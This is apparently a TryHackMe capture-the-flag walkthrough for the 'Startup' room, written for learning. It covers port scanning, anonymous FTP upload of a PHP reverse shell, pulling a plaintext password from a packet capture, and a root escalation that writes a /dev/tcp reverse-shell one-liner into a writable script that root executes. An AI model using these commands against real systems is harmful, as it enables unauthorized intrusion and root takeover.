# Startup

Welcome to another CTF walkthrough, here is the link to the TryHackMe room https://tryhackme.com/room/startup

In order to solve this challenge we will need some tools:
- nmap
- gobuster
- Wireshark
- netcat


If you have never heard of this tools i suggest you to study them first or complete the THM rooms, so you will have a better understeanding of what we are going to do.

Whenever you fell ready you can begin pressing START MACHINE;

To be able to interact with the machine, as THM explains you can either use their attack box or use your own kali linux machine by connecting it via openVPN.

Now that everything has been set let's start with the CTF.

The walktrought won't contain the answers, to not take away the fun, but a step by step tutorial to reach them, by following it you will just have to read the flag or he answers on your own machine.

<br/>
<br/>

## HOW TO START

A good way to approach all the CTFs is to always start by launching an nmap scan, you can use de -a- flag to scan all ports or avoid it to scan only the most common ports.

Let's run it
```bash
nmap -sV [MACHINE IP] 
```

​
And we get the following result:
```
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We find that port 80 is open and is running apache webserver, so let's paste the IP address in the browser and let's give a look around.

We can see a maintenance notice.

Let's check for hiddent directories with gobuster
```bash
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
```

We can see a directory called /files , visit it
- In notice.txt i have found a username: Maya, unfortunately isn't useful for us;
- A meme image;
- an ftp folder that seems empty.

Looks like we can't get any more info here, so let's try to log in the ftp server in anonymous mode.
```bash
ftp IP
```
 
Once prompted for the username and password simply write: anonymous <br/>
It works!

Inside the ftp server move to the ftp folder:
```bash
cd ftp
```

Than we can upload a reverse shell, set up a netcat listener and get our access into the machine.
 
in the ftp server:
```bash
post reverse_shell.php
```

On our machine:
```bash
nc -lvnp
```

To activate the reverse shell go on the website in the files directory, open the ftp folder and click on the file we you have just uploaded.

Once we have the shell use the ls command to see what's inside and we can see a file called 'recipe.txt' , open it with cat and we have the secret ingredient.

Going into the home directory we can see a user called lennie

<br/>
<br/>

## Logging-in as Lennie
Checking the different directories i have found something interesting in /incidents, a file called suspicious.pcapng.
It is a wireshark capture file, to download and analyze it:

On the target machine set up a simple http server with python
```bash
python3 -m http.server 8080
```

On your machine download the file with:
```bash
wget http://IP:8080/suspicious.pcapng
```
<br/>

Now we can open the file with Wireshark and start analyzing packets in the search of something usefull.

After a bit we can notice that there are many packs going in and out between two ports, we can select it and follow the tpc streams.

Once the new window opens scroll down a bit and you will see lennie trying to log in with a plain text password.

<br>

So now we have lennie's credential and we can connect via ssh as we have found that port 22 was open.
```bash
ssh lennie@IP
```

Once inside use the ls command to view inside his home directory and we can see the file user.txt, open it and sumbit the flag.
```bash
cat user.txt
```

<br/>
<br/>

## Privilege Escalation
It is time to find our way to access the root user.

First have fun looking around the directories and reading files as some of them are quite funny.

Looking inside the scripts folder there is an executable called `planner.sh`, lif we check this file permission's with `ls -l` we can see that it is owned by the root user.

The script calls for a file /etc/print.sh
Let's view inside... it only says "done!" , maybe we can modify it and insert a our own code; check the file permissions with:
```bash
ls -l /etc/print.sh
```

Lennie is the owner of the file so we can modify it.

We can insert a reverse shell, so when it will be executed we will have a shell as root.

So edit the file with:
```bash
nano /etc/print.sh
```
Past inside this reverse shell script:
```bash
sh -i >& /dev/tcp/IP/1234 0>&1
```

Remember to substitute the 'IP' with your own machine IP Address.

Set up a netcat listener on your machine:
```bash
nc -lvnp 1234
```

​<br>

And finally run the initial executable:
```bash
./planner.sh
```

You will receive the root's shell.
Look inside the directory with ls and open the file containing the root flag.
```bash
cat root.txt
```

<br/>
<br/>​

Congratulations, you have completed this room, hope you have enjoyed it.

If you want to see more CTFs Writeups explore the directory.

See you in the next challenge. 😊
